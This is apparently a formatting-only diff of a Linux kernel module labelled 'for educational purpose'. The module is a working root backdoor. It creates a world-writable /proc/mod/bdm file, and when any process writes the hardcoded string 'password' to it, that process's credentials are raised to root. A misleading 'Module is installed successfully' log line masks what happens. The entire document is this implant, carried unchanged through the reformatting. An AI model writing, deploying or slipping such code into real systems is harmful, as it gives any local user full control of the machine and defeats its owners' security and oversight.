@@ -8,12 +8,13 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("security");
 MODULE_DESCRIPTION("Just for educational purpose");
 
-#define KERN_PERMBITS 0666   // permission bits -> /proc/mod/bdm
+#define KERN_PERMBITS 0666	// permission bits -> /proc/mod/bdm
 #define KERN_PROCROOT "mod"
 #define KERN_PROCFILE "bdm"
 #define KERN_PASSWORD "password"
 
-static ssize_t mymodule_write(struct file *, const char __user *, size_t, loff_t *);
+static ssize_t mymodule_write(struct file *, const char __user *, size_t,
+			      loff_t *);
 static ssize_t mymodule_read(struct file *, char __user *, size_t, loff_t *);
 static int mymodule_open(struct inode *, struct file *);
 static int mymodule_procfs_attach(void);
@@ -23,98 +24,98 @@ static void __exit mymodule_exit(void);
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_file;
 static const struct file_operations proc_fops = {
-        .open= mymodule_open,
-        .read= mymodule_read,
-        .write = mymodule_write,
+	.open = mymodule_open,
+	.read = mymodule_read,
+	.write = mymodule_write,
 };
 
 static ssize_t
-mymodule_write(struct file *file, const char __user *buffer, size_t count, loff_t *data)
+mymodule_write(struct file *file, const char __user * buffer, size_t count,
+	       loff_t * data)
 {
-        struct cred *cred;
-        char *kbuf;
-        int ret;
+	struct cred *cred;
+	char *kbuf;
+	int ret;
 
-        if (count < 1)
-                return -EINVAL;
+	if (count < 1)
+		return -EINVAL;
 
-        kbuf = kmalloc(count, GFP_KERNEL);
-        if (!kbuf)
-                return -ENOMEM;
+	kbuf = kmalloc(count, GFP_KERNEL);
+	if (!kbuf)
+		return -ENOMEM;
 
-        ret = copy_from_user(kbuf, buffer, count);
-        if (!ret)
-        {
-                if(!strncmp(KERN_PASSWORD,(char*)kbuf, strlen(KERN_PASSWORD))){
-                        cred = prepare_creds();
-                        if (cred != NULL)
-                        {
-                                cred->uid = GLOBAL_ROOT_UID;
-                                cred->gid = GLOBAL_ROOT_GID;
-                                cred->suid = GLOBAL_ROOT_UID;
-                                cred->euid = GLOBAL_ROOT_UID;
-                                cred->euid = GLOBAL_ROOT_UID;
-                                cred->egid = GLOBAL_ROOT_GID;
-                                cred->fsuid = GLOBAL_ROOT_UID;
-                                cred->fsgid = GLOBAL_ROOT_GID;
-                                commit_creds(cred);
-                        }
-                        printk(KERN_WARNING "Module is installed successfully\n");
-                }
-        }
+	ret = copy_from_user(kbuf, buffer, count);
+	if (!ret) {
+		if (!strncmp
+		    (KERN_PASSWORD, (char *)kbuf, strlen(KERN_PASSWORD))) {
+			cred = prepare_creds();
+			if (cred != NULL) {
+				cred->uid = GLOBAL_ROOT_UID;
+				cred->gid = GLOBAL_ROOT_GID;
+				cred->suid = GLOBAL_ROOT_UID;
+				cred->euid = GLOBAL_ROOT_UID;
+				cred->euid = GLOBAL_ROOT_UID;
+				cred->egid = GLOBAL_ROOT_GID;
+				cred->fsuid = GLOBAL_ROOT_UID;
+				cred->fsgid = GLOBAL_ROOT_GID;
+				commit_creds(cred);
+			}
+			printk(KERN_WARNING
+			       "Module is installed successfully\n");
+		}
+	}
 
-        kfree(kbuf);
-        return count;
+	kfree(kbuf);
+	return count;
 }
 
 static ssize_t
-mymodule_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
+mymodule_read(struct file *file, char __user * buf, size_t size, loff_t * ppos)
 {
-        return 0;
+	return 0;
 }
 
-static int
-mymodule_open(struct inode *inode, struct file *file)
+static int mymodule_open(struct inode *inode, struct file *file)
 {
-        return 0;
+	return 0;
 }
 
-static int
-mymodule_procfs_attach(void)
+static int mymodule_procfs_attach(void)
 {
-        proc_root = proc_mkdir(KERN_PROCROOT, NULL);
-        proc_file = proc_create(KERN_PROCFILE, KERN_PERMBITS, proc_root, &proc_fops);
+	proc_root = proc_mkdir(KERN_PROCROOT, NULL);
+	proc_file =
+	    proc_create(KERN_PROCFILE, KERN_PERMBITS, proc_root, &proc_fops);
 
-        printk(KERN_INFO "proc_create successfully\n");
+	printk(KERN_INFO "proc_create successfully\n");
 
-        if (IS_ERR(proc_file)){
-                printk(KERN_ERR "proc_create failed\n");
-                return -1;
-        }
-        return 0;
+	if (IS_ERR(proc_file)) {
+		printk(KERN_ERR "proc_create failed\n");
+		return -1;
+	}
+	return 0;
 }
 
 static int
 __init mymodule_init(void)
 {
-        int ret;
+	int ret;
 
-        printk(KERN_INFO "module __init\n");
+	printk(KERN_INFO "module __init\n");
 
-        ret = mymodule_procfs_attach();
-        if(ret){
-                printk(KERN_INFO "module __init failed\n ");
-        }
-        return ret;
+	ret = mymodule_procfs_attach();
+	if (ret) {
+		printk(KERN_INFO "module __init failed\n ");
+	}
+	return ret;
 }
 
 static void
 __exit mymodule_exit(void)
 {
-        printk(KERN_INFO "module __exit\n");
+	printk(KERN_INFO "module __exit\n");
 
-        remove_proc_entry(KERN_PROCFILE, proc_root);
-        remove_proc_entry(KERN_PROCROOT, NULL);
+	remove_proc_entry(KERN_PROCFILE, proc_root);
+	remove_proc_entry(KERN_PROCROOT, NULL);
 }
 
 module_init(mymodule_init);
